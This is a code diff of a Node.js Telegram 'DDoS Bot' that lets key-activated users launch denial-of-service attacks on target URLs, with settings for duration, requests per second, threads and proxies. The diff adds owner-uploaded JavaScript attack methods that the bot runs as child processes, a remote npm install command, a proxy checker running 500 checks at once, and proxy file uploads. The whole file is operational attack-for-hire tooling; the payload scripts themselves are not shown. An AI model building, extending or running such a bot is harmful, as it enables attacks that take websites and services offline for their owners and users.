@@ -1,18 +1,35 @@
 const fs = require('fs').promises;
+const fsSync = require('fs');
 const path = require('path');
-const { spawn } = require('child_process');
+const { spawn, exec } = require('child_process'); // added exec
 const TelegramBot = require('node-telegram-bot-api');
 const crypto = require('crypto');
+const axios = require('axios');
+const net = require('net');
 const { scrapeProxies } = require('./proxies.js');
 
 // ---------- HARDCODED CONFIGURATION ----------
-const BOT_TOKEN = 'ENTER_BOT_TOKEN'; // ផ្លាស់ប្តូ bot token
-const OWNER_ID = ENTER_CHAT_ID; // ផ្លាស់ប្តូ chat id
+const BOT_TOKEN = 'Enter_BOT_token';        // <--  ផ្លាសប្តូ your bot token
+const OWNER_ID = Enter_chat_id;                     // <-- ផ្លាស់ប្តូ chat id
 const SCRIPT_DIR = __dirname;
 const PROXY_DIR = __dirname;
+const METHODS_DIR = path.join(__dirname, 'methods');
 const DEFAULT_PROXY_FILE = 'proxy.txt';
-const ATTACK_ANIMATION_URL = 'https://a.top4top.io/m_3718ze7811.mp4';
+const ATTACK_ANIMATION_URL = 'https://e.top4top.io/m_3728a0ce61.mp4'; // only for /attack
 const DATA_FILE = path.join(__dirname, 'bot_data.json');
+
+// Ensure methods directory exists
+if (!fsSync.existsSync(METHODS_DIR)) {
+  fsSync.mkdirSync(METHODS_DIR);
+}
+
+// Built-in methods (cannot be deleted)
+const BUILTIN_METHODS = {
+  zaher: 'zaher.js',
+  zaherH2: 'zaherH2.js',
+  cfzaher: 'cfzaher.js',
+  L4: 'L4.js'
+};
 
 // Role-based limits
 const ROLE_LIMITS = {
@@ -29,24 +46,25 @@ const ROLE_LIMITS = {
     maxConcurrent: 10
   }
 };
-// --------------------------------------------
+// -----------------------------------
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// ---------- Data Store (with role) ----------
+// ---------- Data Store ----------
 class DataStore {
   constructor(file) {
     this.file = file;
-    this.data = { users: {}, keys: {} };
+    this.data = { users: {}, keys: {}, methods: {} };
   }
 
   async load() {
     try {
       const raw = await fs.readFile(this.file, 'utf8');
       this.data = JSON.parse(raw);
+      if (!this.data.methods) this.data.methods = {};
     } catch (err) {
       if (err.code !== 'ENOENT') console.error('Failed to load data:', err);
-      this.data = { users: {}, keys: {} };
+      this.data = { users: {}, keys: {}, methods: {} };
       await this.save();
     }
   }
@@ -107,6 +125,25 @@ class DataStore {
     delete this.data.keys[key];
     this.save();
   }
+
+  // Method management
+  addMethod(name, fileName) {
+    this.data.methods[name] = fileName;
+    this.save();
+  }
+
+  removeMethod(name) {
+    delete this.data.methods[name];
+    this.save();
+  }
+
+  getMethodFile(name) {
+    return this.data.methods[name];
+  }
+
+  getAllMethods() {
+    return { ...BUILTIN_METHODS, ...this.data.methods };
+  }
 }
 
 const db = new DataStore(DATA_FILE);
@@ -152,6 +189,7 @@ class AttackManager {
 
 const attackManager = new AttackManager();
 
+// ---------- Role Helpers ----------
 function getUserRole(userId) {
   if (userId === OWNER_ID) return 'owner';
   const user = db.getUser(userId);
@@ -187,10 +225,12 @@ function checkAttackLimits(userId, method, target, time, rps, threads) {
   return null;
 }
 
+// ---------- Validation (with proper file check) ----------
 function validateAttackParams(method, target, time, rps, threads, proxyFile) {
-  const validMethods = ['zaher', 'zaherH2', 'cfzaher'];
-  if (!validMethods.includes(method)) {
-    return `❌ Invalid method: ${method}. Use: ${validMethods.join(', ')}`;
+  const allMethods = db.getAllMethods();
+  if (!allMethods[method]) {
+    const available = Object.keys(allMethods).join(', ');
+    return `❌ Invalid method: ${method}. Available: ${available}`;
   }
   try {
     new URL(target);
@@ -205,19 +245,22 @@ function validateAttackParams(method, target, time, rps, threads, proxyFile) {
   if (isNaN(threadsNum) || threadsNum <= 0) return `❌ Invalid threads: ${threads}. Must be positive number`;
 
   const proxyPath = proxyFile ? path.join(PROXY_DIR, proxyFile) : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
-  if (!require('fs').existsSync(proxyPath)) {
-    return `❌ Proxy file not found: ${proxyFile || DEFAULT_PROXY_FILE}. Run /scrape first.`;
+  try {
+    fsSync.accessSync(proxyPath, fsSync.constants.R_OK);
+  } catch {
+    return `❌ Proxy file not found or not readable: ${proxyFile || DEFAULT_PROXY_FILE}. Run /listproxies to see available files.`;
   }
   return null;
 }
 
 function getScriptPath(method) {
-  const map = {
-    zaher: 'zaher.js',
-    zaherH2: 'zaherH2.js',
-    cfzaher: 'cfzaher.js'
-  };
-  return path.join(SCRIPT_DIR, map[method]);
+  const allMethods = db.getAllMethods();
+  const fileName = allMethods[method];
+  if (BUILTIN_METHODS[method]) {
+    return path.join(SCRIPT_DIR, fileName);
+  } else {
+    return path.join(METHODS_DIR, fileName);
+  }
 }
 
 // ---------- Authorization Middleware ----------
@@ -235,30 +278,115 @@ async function requireAuth(msg) {
   return true;
 }
 
+// ---------- Proxy Checker Function ----------
+async function checkProxyFile(inputFile, outputFile, progressCallback) {
+  let proxies;
+  try {
+    const data = await fs.readFile(inputFile, 'utf8');
+    proxies = data.split('\n').map(line => line.trim()).filter(line => line);
+  } catch (err) {
+    throw new Error(`Cannot read input file: ${inputFile}`);
+  }
+
+  const total = proxies.length;
+  let alive = 0;
+  let dead = 0;
+  const results = [];
+
+  const tcpCheck = (host, port) => {
+    return new Promise((resolve) => {
+      const socket = new net.Socket();
+      const timeout = setTimeout(() => {
+        socket.destroy();
+        resolve(false);
+      }, 2000);
+
+      socket.once('connect', () => {
+        clearTimeout(timeout);
+        socket.destroy();
+        resolve(true);
+      });
+
+      socket.once('error', () => {
+        clearTimeout(timeout);
+        socket.destroy();
+        resolve(false);
+      });
+
+      socket.connect(port, host);
+    });
+  };
+
+  const httpCheck = async (proxy) => {
+    const [host, port] = proxy.split(':');
+    try {
+      const response = await axios.get('http://httpbin.org/get', {
+        proxy: { host, port: parseInt(port, 10) },
+        timeout: 3000
+      });
+      return response.status === 200;
+    } catch {
+      return false;
+    }
+  };
+
+  const checkOne = async (proxy) => {
+    const [host, port] = proxy.split(':');
+    const tcpOk = await tcpCheck(host, parseInt(port, 10));
+    if (!tcpOk) {
+      dead++;
+      if (progressCallback) progressCallback(alive, dead, total);
+      return;
+    }
+    const httpOk = await httpCheck(proxy);
+    if (httpOk) {
+      alive++;
+      results.push(proxy);
+    } else {
+      dead++;
+    }
+    if (progressCallback) progressCallback(alive, dead, total);
+  };
+
+  const CONCURRENT = 500;
+  for (let i = 0; i < proxies.length; i += CONCURRENT) {
+    const batch = proxies.slice(i, i + CONCURRENT);
+    await Promise.all(batch.map(proxy => checkOne(proxy)));
+  }
+
+  await fs.writeFile(outputFile, results.join('\n'));
+  return { alive, dead, total };
+}
+
 // ---------- Command Handlers ----------
 const commands = new Map();
 
 // /start
 commands.set('/start', async (msg) => {
   if (!await requireAuth(msg)) return;
-  await bot.sendAnimation(msg.chat.id, ATTACK_ANIMATION_URL, {
-    caption: 
+  await bot.sendMessage(msg.chat.id,
     `👋 *Welcome to DDoS Bot*\n\n` +
     `📝 *Quick Commands:*\n` +
     `/attack - Launch an attack\n` +
     `/list - Show active attacks\n` +
     `/stop <id> - Stop an attack\n` +
     `/stopall - Stop all active attacks\n` +
-    `/scrape - Update proxy list\n\n` +
+    `/scrape - Update proxy list\n` +
+    `/checkproxy - Test and clean proxy file\n` +
+    `/uploadproxy - Upload your own proxy file\n` +
+    `/listproxies - Show available proxy files\n` +
+    `/addmethod - (Owner) Upload a new attack method (.js)\n` +
+    `/delmethod <name> - (Owner) Remove a user-added method\n` +
+    `/npm <requirement> - (Owner) Install npm dependencies in methods folder\n\n` +
     `ℹ️ *More Info:*\n` +
     `/help - Full usage guide\n` +
     `/methods - Available attack methods\n` +
     `👑 *Owner only* – /panel`,
-    parse_mode: 'Markdown'
-  });
+    { parse_mode: 'Markdown' }
+  );
 });
 
-// /help (shows user's limits)
+// /help
 commands.set('/help', async (msg) => {
   if (!await requireAuth(msg)) return;
   const role = getUserRole(msg.from.id);
@@ -267,12 +395,12 @@ commands.set('/help', async (msg) => {
     ? '∞ (owner)' 
     : `Max time: ${limits.maxTime}s\nMax RPS: ${limits.maxRps}\nMax threads: ${limits.maxThreads}\nMax concurrent: ${limits.maxConcurrent}`;
 
-  await bot.sendAnimation(msg.chat.id, ATTACK_ANIMATION_URL, {
-    caption: `📖 *Complete Usage Guide*\n\n` +
+  await bot.sendMessage(msg.chat.id,
+    `📖 *Complete Usage Guide*\n\n` +
     `*1. ATTACK COMMAND*\n` +
     `\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
     `📌 *Parameters:*\n` +
-    `  • method: zaher, zaherH2, or cfzaher\n` +
+    `  • method: any built-in or user-added method (see /methods)\n` +
     `  • url: Target URL (https://example.com)\n` +
     `  • time: Duration in seconds\n` +
     `  • rps: Requests per second\n` +
@@ -285,27 +413,90 @@ commands.set('/help', async (msg) => {
     `\`/stop <id>\` - Stop a specific attack\n` +
     `\`/stopall\` - Stop all active attacks\n\n` +
     `*3. PROXIES*\n` +
-    `\`/scrape\` - Fetch and update proxies\n\n` +
-    `*4. INFO*\n` +
-    `\`/methods\` - Show available methods\n\n` +
+    `\`/scrape\` - Fetch fresh proxies\n` +
+    `\`/checkproxy [filename]\` - Test and clean a proxy file\n` +
+    `\`/uploadproxy\` - Upload your own proxy file (send as document)\n` +
+    `\`/listproxies\` - List all available proxy files\n\n` +
+    `*4. METHODS*\n` +
+    `\`/methods\` - Show available attack methods\n` +
+    `\`/addmethod\` - (Owner) Upload a new attack method (.js)\n` +
+    `\`/delmethod <name>\` - (Owner) Remove a user-added method\n` +
+    `\`/npm <requirement>\` - (Owner) Install npm dependencies in methods folder\n\n` +
     `*5. YOUR LIMITS (${role})*\n` +
     `${limitsText}\n\n` +
     `*6. OWNER PANEL*\n` +
     `If you are the owner, use /panel to see admin commands.`,
-    parse_mode: 'Markdown'
-  });
+    { parse_mode: 'Markdown' }
+  );
 });
 
 // /methods
 commands.set('/methods', async (msg) => {
   if (!await requireAuth(msg)) return;
+  const allMethods = db.getAllMethods();
+  const builtInList = Object.keys(BUILTIN_METHODS).join(', ');
+  const userMethods = Object.keys(db.data.methods);
+  const userList = userMethods.length ? userMethods.join(', ') : '(none)';
   await bot.sendMessage(msg.chat.id,
-    `📋 *Available attack methods:*\n` +
-    `- \`zaher\`\n` +
-    `- \`zaherH2\`\n` +
-    `- \`cfzaher\``,
+    `📋 *Available attack methods:*\n\n` +
+    `*Built-in:*\n\`${builtInList}\`\n\n` +
+    `*User-added:*\n\`${userList}\``,
     { parse_mode: 'Markdown' }
   );
+});
+
+// /addmethod
+commands.set('/addmethod', async (msg) => {
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
+  await bot.sendMessage(msg.chat.id,
+    '📤 Please send the JavaScript file for the new method as a document.',
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// /delmethod
+commands.set('/delmethod', async (msg) => {
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
+  const args = msg.text.split(' ').slice(1);
+  if (args.length === 0) {
+    return bot.sendMessage(msg.chat.id, '❌ Usage: /delmethod <method_name>', { parse_mode: 'Markdown' });
+  }
+  const methodName = args[0];
+  if (BUILTIN_METHODS[methodName]) {
+    return bot.sendMessage(msg.chat.id, '❌ Cannot delete built-in method.', { parse_mode: 'Markdown' });
+  }
+  const fileName = db.getMethodFile(methodName);
+  if (!fileName) {
+    return bot.sendMessage(msg.chat.id, `❌ Method \`${methodName}\` not found.`, { parse_mode: 'Markdown' });
+  }
+  const filePath = path.join(METHODS_DIR, fileName);
+  try {
+    await fs.unlink(filePath);
+  } catch (err) {
+    console.error(`Failed to delete method file: ${err.message}`);
+  }
+  db.removeMethod(methodName);
+  await bot.sendMessage(msg.chat.id, `✅ Method \`${methodName}\` removed.`, { parse_mode: 'Markdown' });
+});
+
+// /installmethods – NEW COMMAND
+commands.set('/npm', async (msg) => {
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
+  const statusMsg = await bot.sendMessage(msg.chat.id, '📦 Installing npm packages in methods directory...', { parse_mode: 'Markdown' });
+  exec('npm install', { cwd: METHODS_DIR }, (error, stdout, stderr) => {
+    if (error) {
+      bot.editMessageText(`❌ Installation failed:\n\`\`\`\n${error.message}\n\`\`\``, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
+      return;
+    }
+    const output = stdout || stderr || 'No output';
+    bot.editMessageText(`✅ npm install completed.\n\`\`\`\n${output.substring(0, 1000)}\n\`\`\``, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
+  });
 });
 
 // /scrape
@@ -335,6 +526,86 @@ commands.set('/scrape', async (msg) => {
       `❌ Scraping failed: ${err.message}`,
       { chat_id: msg.chat.id, message_id: statusMsg.message_id }
     );
+  }
+});
+
+// /checkproxy
+commands.set('/checkproxy', async (msg) => {
+  if (!await requireAuth(msg)) return;
+  const chatId = msg.chat.id;
+  const args = msg.text.split(' ').slice(1);
+  let inputFile = args[0] || DEFAULT_PROXY_FILE;
+  const inputPath = path.join(PROXY_DIR, inputFile);
+
+  try {
+    fsSync.accessSync(inputPath, fsSync.constants.R_OK);
+  } catch {
+    return bot.sendMessage(chatId, `❌ File \`${inputFile}\` not found or not readable.`, { parse_mode: 'Markdown' });
+  }
+
+  const statusMsg = await bot.sendMessage(chatId, `🔍 Checking proxies in \`${inputFile}\`...`, { parse_mode: 'Markdown' });
+
+  const parsed = path.parse(inputFile);
+  const outputFile = `${parsed.name}_checked${parsed.ext}`;
+  const outputPath = path.join(PROXY_DIR, outputFile);
+
+  let lastUpdate = Date.now();
+  const progressCallback = (alive, dead, total) => {
+    if (Date.now() - lastUpdate > 2000) {
+      bot.editMessageText(
+        `🔍 Checking: ${alive + dead}/${total} processed | Alive: ${alive} | Dead: ${dead}`,
+        { chat_id: chatId, message_id: statusMsg.message_id }
+      ).catch(() => {});
+      lastUpdate = Date.now();
+    }
+  };
+
+  try {
+    const { alive, dead, total } = await checkProxyFile(inputPath, outputPath, progressCallback);
+    await bot.editMessageText(
+      `✅ Check complete!\n📊 Total: ${total} | ✅ Alive: ${alive} | ❌ Dead: ${dead}\n📁 Saved to \`${outputFile}\``,
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
+    );
+
+    if (alive > 0) {
+      await bot.sendDocument(chatId, outputPath, { caption: `✅ Working proxies (${alive})` });
+    } else {
+      await bot.sendMessage(chatId, '⚠️ No working proxies found.', { parse_mode: 'Markdown' });
+    }
+  } catch (err) {
+    await bot.editMessageText(`❌ Error: ${err.message}`, { chat_id: chatId, message_id: statusMsg.message_id });
+  }
+});
+
+// /listproxies
+commands.set('/listproxies', async (msg) => {
+  if (!await requireAuth(msg)) return;
+  const chatId = msg.chat.id;
+  try {
+    const files = await fs.readdir(PROXY_DIR);
+    const proxyFiles = files.filter(f => f.endsWith('.txt') && f !== 'bot_data.json');
+    
+    proxyFiles.sort((a, b) => {
+      const aNum = a.match(/^proxy(\d+)\.txt$/);
+      const bNum = b.match(/^proxy(\d+)\.txt$/);
+      if (aNum && bNum) return parseInt(aNum[1]) - parseInt(bNum[1]);
+      if (aNum) return -1;
+      if (bNum) return 1;
+      return a.localeCompare(b);
+    });
+
+    if (proxyFiles.length === 0) {
+      return bot.sendMessage(chatId, '📭 No proxy files found.', { parse_mode: 'Markdown' });
+    }
+    let response = `📋 *Available proxy files:*\n\n`;
+    for (const file of proxyFiles) {
+      const stat = await fs.stat(path.join(PROXY_DIR, file));
+      const lines = (await fs.readFile(path.join(PROXY_DIR, file), 'utf8')).split('\n').filter(l => l.trim()).length;
+      response += `📄 \`${file}\` – ${lines} proxies, ${(stat.size / 1024).toFixed(1)} KB\n`;
+    }
+    await bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
   }
 });
 
@@ -370,6 +641,13 @@ commands.set('/attack', async (msg) => {
     : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
 
   const scriptPath = getScriptPath(method);
+  // Check if script exists
+  try {
+    fsSync.accessSync(scriptPath, fsSync.constants.R_OK);
+  } catch {
+    return bot.sendMessage(chatId, `❌ Attack script not found: ${method}. Please contact owner.`, { parse_mode: 'Markdown' });
+  }
+
   const scriptArgs = [target, time, rps, threads, proxyPath];
 
   const child = spawn('node', [scriptPath, ...scriptArgs], {
@@ -461,7 +739,7 @@ commands.set('/list', async (msg) => {
     response += `⏱️ Progress: ${runningFor}/${attack.time}s (${progress}%)\n`;
     response += `⏳ Time left: ${timeLeft}s\n\n`;
   }
-  await bot.sendAnimation(msg.chat.id, ATTACK_ANIMATION_URL, { caption: response, parse_mode: 'Markdown' });
+  await bot.sendMessage(msg.chat.id, response, { parse_mode: 'Markdown' });
 });
 
 // /stop
@@ -482,6 +760,10 @@ commands.set('/stop', async (msg) => {
     return bot.sendMessage(msg.chat.id, `❌ No active attack with ID ${attackId}`, { parse_mode: 'Markdown' });
   }
 
+  if (msg.from.id !== OWNER_ID && attack.userId !== msg.from.id) {
+    return bot.sendMessage(msg.chat.id, '⛔ You can only stop your own attacks.', { parse_mode: 'Markdown' });
+  }
+
   try {
     attack.child.kill();
   } catch (err) {
@@ -500,7 +782,9 @@ commands.set('/stop', async (msg) => {
 
 // /stopall
 commands.set('/stopall', async (msg) => {
-  if (!await requireAuth(msg)) return;
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
   const count = attackManager.list().length;
   if (count === 0) {
     return bot.sendMessage(msg.chat.id, '📭 No active attacks to stop.', { parse_mode: 'Markdown' });
@@ -509,7 +793,73 @@ commands.set('/stopall', async (msg) => {
   await bot.sendMessage(msg.chat.id, `🛑 Stopped all ${count} active attacks.`, { parse_mode: 'Markdown' });
 });
 
-// ==================== OWNER PANEL COMMANDS ====================
+// /genkey
+commands.set('/genkey', async (msg) => {
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
+  const args = msg.text.split(' ').slice(1);
+  if (args.length < 1) {
+    return bot.sendMessage(msg.chat.id, '❌ Usage: /genkey <hours> [role]', { parse_mode: 'Markdown' });
+  }
+  const hours = parseInt(args[0], 10);
+  if (isNaN(hours) || hours <= 0) {
+    return bot.sendMessage(msg.chat.id, '❌ Hours must be a positive number.', { parse_mode: 'Markdown' });
+  }
+  let role = 'normal';
+  if (args.length >= 2) {
+    role = args[1].toLowerCase();
+    if (role !== 'vip' && role !== 'normal') {
+      return bot.sendMessage(msg.chat.id, '❌ Role must be `vip` or `normal`.', { parse_mode: 'Markdown' });
+    }
+  }
+
+  const randomPart = crypto.randomBytes(4).toString('hex');
+  const key = `zaher_${randomPart}`;
+  const expires = Date.now() + hours * 3600000;
+  db.addKey(key, expires, role);
+
+  await bot.sendMessage(
+    msg.chat.id,
+    `✅ *Key generated*\nKey: \`${key}\`\nRole: ${role}\nExpires: ${new Date(expires).toLocaleString()}\nDuration: ${hours} hour(s)`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// /activate
+commands.set('/activate', async (msg) => {
+  const args = msg.text.split(' ').slice(1);
+  if (args.length === 0) {
+    return bot.sendMessage(msg.chat.id, '❌ Usage: /activate <key>', { parse_mode: 'Markdown' });
+  }
+  const key = args[0];
+  const keyData = db.getKey(key);
+  if (!keyData) {
+    return bot.sendMessage(msg.chat.id, '❌ Invalid key.', { parse_mode: 'Markdown' });
+  }
+  if (keyData.expires < Date.now()) {
+    db.deleteKey(key);
+    return bot.sendMessage(msg.chat.id, '❌ Key expired.', { parse_mode: 'Markdown' });
+  }
+
+  db.addUser(msg.from.id, keyData.expires, keyData.role);
+  db.deleteKey(key);
+  await bot.sendMessage(
+    msg.chat.id,
+    `✅ *Activation successful!*\nYour role: ${keyData.role}\nAccess expires on: ${new Date(keyData.expires).toLocaleString()}`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// /restart
+commands.set('/restart', async (msg) => {
+  if (msg.from.id !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+  }
+  await bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'Markdown' });
+  attackManager.stopAll();
+  setTimeout(() => process.exit(0), 1000);
+});
 
 // /panel
 commands.set('/panel', async (msg) => {
@@ -527,6 +877,10 @@ commands.set('/panel', async (msg) => {
     `/broadcast <message> - Send message to all users\n\n` +
     `*Statistics*\n` +
     `/stats - Bot statistics\n\n` +
+    `*Methods*\n` +
+    `/addmethod - Upload a new attack method (.js)\n` +
+    `/delmethod <name> - Remove a user-added method\n` +
+    `/npm <requirement> - Install npm dependencies in methods folder\n\n` +
     `*System*\n` +
     `/restart - Restart bot`;
   await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
@@ -611,64 +965,6 @@ commands.set('/promote', async (msg) => {
   await bot.sendMessage(msg.chat.id, `✅ User \`${userId}\` is now **${role}**.`, { parse_mode: 'Markdown' });
 });
 
-// /genkey
-commands.set('/genkey', async (msg) => {
-  if (msg.from.id !== OWNER_ID) {
-    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
-  }
-  const args = msg.text.split(' ').slice(1);
-  if (args.length < 1) {
-    return bot.sendMessage(msg.chat.id, '❌ Usage: /genkey <hours> [role]', { parse_mode: 'Markdown' });
-  }
-  const hours = parseInt(args[0], 10);
-  if (isNaN(hours) || hours <= 0) {
-    return bot.sendMessage(msg.chat.id, '❌ Hours must be a positive number.', { parse_mode: 'Markdown' });
-  }
-  let role = 'normal';
-  if (args.length >= 2) {
-    role = args[1].toLowerCase();
-    if (role !== 'vip' && role !== 'normal') {
-      return bot.sendMessage(msg.chat.id, '❌ Role must be `vip` or `normal`.', { parse_mode: 'Markdown' });
-    }
-  }
-
-  const randomPart = crypto.randomBytes(4).toString('hex');
-  const key = `zaher_${randomPart}`;
-  const expires = Date.now() + hours * 3600000;
-  db.addKey(key, expires, role);
-
-  await bot.sendMessage(
-    msg.chat.id,
-    `✅ *Key generated*\nKey: \`${key}\`\nRole: ${role}\nExpires: ${new Date(expires).toLocaleString()}\nDuration: ${hours} hour(s)`,
-    { parse_mode: 'Markdown' }
-  );
-});
-
-// /activate
-commands.set('/activate', async (msg) => {
-  const args = msg.text.split(' ').slice(1);
-  if (args.length === 0) {
-    return bot.sendMessage(msg.chat.id, '❌ Usage: /activate <key>', { parse_mode: 'Markdown' });
-  }
-  const key = args[0];
-  const keyData = db.getKey(key);
-  if (!keyData) {
-    return bot.sendMessage(msg.chat.id, '❌ Invalid key.', { parse_mode: 'Markdown' });
-  }
-  if (keyData.expires < Date.now()) {
-    db.deleteKey(key);
-    return bot.sendMessage(msg.chat.id, '❌ Key expired.', { parse_mode: 'Markdown' });
-  }
-
-  db.addUser(msg.from.id, keyData.expires, keyData.role);
-  db.deleteKey(key);
-  await bot.sendMessage(
-    msg.chat.id,
-    `✅ *Activation successful!*\nYour role: ${keyData.role}\nAccess expires on: ${new Date(keyData.expires).toLocaleString()}`,
-    { parse_mode: 'Markdown' }
-  );
-});
-
 // /broadcast
 commands.set('/broadcast', async (msg) => {
   if (msg.from.id !== OWNER_ID) {
@@ -700,7 +996,7 @@ commands.set('/stats', async (msg) => {
   const users = db.getAllUsers();
   const attacks = attackManager.list();
   const keys = Object.keys(db.data.keys).length;
-  const proxyCount = require('fs').existsSync(path.join(PROXY_DIR, DEFAULT_PROXY_FILE))
+  const proxyCount = fsSync.existsSync(path.join(PROXY_DIR, DEFAULT_PROXY_FILE))
     ? (await fs.readFile(path.join(PROXY_DIR, DEFAULT_PROXY_FILE), 'utf8')).split('\n').filter(l => l.trim()).length
     : 0;
   const stats = 
@@ -714,17 +1010,120 @@ commands.set('/stats', async (msg) => {
   await bot.sendMessage(msg.chat.id, stats, { parse_mode: 'Markdown' });
 });
 
-// /restart
-commands.set('/restart', async (msg) => {
-  if (msg.from.id !== OWNER_ID) {
-    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
+// ---------- Document Handler (Unified) ----------
+bot.on('document', async (msg) => {
+  // Only allow authorized users
+  if (!await requireAuth(msg)) return;
+
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const document = msg.document;
+
+  // CASE 1: Method upload (owner only, .js file)
+  if (userId === OWNER_ID && (document.file_name.endsWith('.js') || document.mime_type === 'application/javascript' || document.mime_type === 'text/javascript')) {
+    const baseName = path.basename(document.file_name, '.js');
+    const safeBase = baseName.replace(/[^a-zA-Z0-9]/g, '_');
+    const fileName = `method_${safeBase}.js`;
+    const filePath = path.join(METHODS_DIR, fileName);
+    const methodName = safeBase.toLowerCase();
+
+    const allMethods = db.getAllMethods();
+    if (allMethods[methodName]) {
+      return bot.sendMessage(chatId, `❌ Method \`${methodName}\` already exists.`, { parse_mode: 'Markdown' });
+    }
+
+    try {
+      const fileLink = await bot.getFileLink(document.file_id);
+      const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
+      const writer = fsSync.createWriteStream(filePath);
+      response.data.pipe(writer);
+
+      await new Promise((resolve, reject) => {
+        writer.on('finish', resolve);
+        writer.on('error', reject);
+      });
+
+      const content = await fs.readFile(filePath, 'utf8');
+      if (content.trim().length === 0) {
+        await fs.unlink(filePath);
+        return bot.sendMessage(chatId, '❌ File is empty.');
+      }
+
+      db.addMethod(methodName, fileName);
+      await bot.sendMessage(
+        chatId,
+        `✅ *Method added successfully!*\n` +
+        `Name: \`${methodName}\`\n` +
+        `File: \`${fileName}\`\n` +
+        `You can now use it: \`/attack ${methodName} ...\`\n` +
+        `If this method requires npm packages, run /installmethods.`, // <-- added note
+        { parse_mode: 'Markdown' }
+      );
+    } catch (err) {
+      console.error('Method upload error:', err);
+      bot.sendMessage(chatId, `❌ Failed to save method: ${err.message}`);
+      try { await fs.unlink(filePath); } catch {}
+    }
+    return;
   }
-  await bot.sendMessage(msg.chat.id, '🔄 Restarting bot...', { parse_mode: 'Markdown' });
-  attackManager.stopAll();
-  setTimeout(() => process.exit(0), 1000);
+
+  // CASE 2: Proxy upload (any authorized user, .txt file)
+  if (document.mime_type === 'text/plain' || document.file_name.endsWith('.txt')) {
+    let nextNumber = 1;
+    try {
+      const files = await fs.readdir(PROXY_DIR);
+      const proxyFiles = files.filter(f => /^proxy\d+\.txt$/.test(f));
+      const numbers = proxyFiles.map(f => parseInt(f.match(/\d+/)[0], 10));
+      if (numbers.length > 0) {
+        nextNumber = Math.max(...numbers) + 1;
+      }
+    } catch (err) {
+      console.error('Error scanning proxy files:', err);
+      return bot.sendMessage(chatId, '❌ Error accessing file directory. Please try again.');
+    }
+
+    const fileName = `proxy${nextNumber}.txt`;
+    const filePath = path.join(PROXY_DIR, fileName);
+
+    try {
+      const fileLink = await bot.getFileLink(document.file_id);
+      const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
+      const writer = fsSync.createWriteStream(filePath);
+      response.data.pipe(writer);
+
+      await new Promise((resolve, reject) => {
+        writer.on('finish', resolve);
+        writer.on('error', reject);
+      });
+
+      const content = await fs.readFile(filePath, 'utf8');
+      const lines = content.split('\n').filter(l => l.trim()).length;
+      if (lines === 0) {
+        await fs.unlink(filePath);
+        return bot.sendMessage(chatId, '❌ File is empty. Upload a file with proxies (one per line: ip:port).');
+      }
+
+      await bot.sendMessage(
+        chatId,
+        `✅ *Proxy file uploaded successfully!*\n` +
+        `📁 Filename: \`${fileName}\`\n` +
+        `📊 Proxies: ${lines}\n` +
+        `You can now use it in attacks: \`/attack ... ${fileName}\``,
+        { parse_mode: 'Markdown' }
+      );
+      console.log(`[UPLOAD] User ${userId} uploaded ${fileName} (${lines} proxies)`);
+    } catch (err) {
+      console.error(`[UPLOAD ERROR] User ${userId}:`, err.message);
+      try { await fs.unlink(filePath); } catch {}
+      bot.sendMessage(chatId, `❌ Failed to save file: ${err.message}`);
+    }
+    return;
+  }
+
+  bot.sendMessage(chatId, '❌ Unsupported file type. Please upload a `.txt` file for proxies or a `.js` file (owner only) for a new method.');
 });
 
-// ---------- Message handler ----------
+// ---------- Message handler for text commands ----------
 bot.on('message', async (msg) => {
   if (!msg.text || !msg.text.startsWith('/')) return;
   const command = msg.text.split(' ')[0].toLowerCase();
